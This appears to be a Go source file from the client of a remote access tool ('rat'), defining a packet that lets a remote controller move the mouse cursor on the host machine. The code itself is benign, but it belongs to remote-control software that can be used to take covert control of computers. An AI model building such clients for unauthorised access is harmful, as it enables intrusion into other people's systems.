package main

import (
	"rat/client/network/header"
	"rat/client/screen"

	"github.com/pkg/bson"
)

type MouseMovePacket struct {
	MonitorID int "monitor"
	X         int
	Y         int
}

func (packet MouseMovePacket) Header() header.PacketHeader {
	return header.MouseMoveHeader
}

func (packet MouseMovePacket) OnReceive() error {
	screen.MoveCursor(packet.MonitorID, packet.X, packet.Y)

	return nil
}

func (packet MouseMovePacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
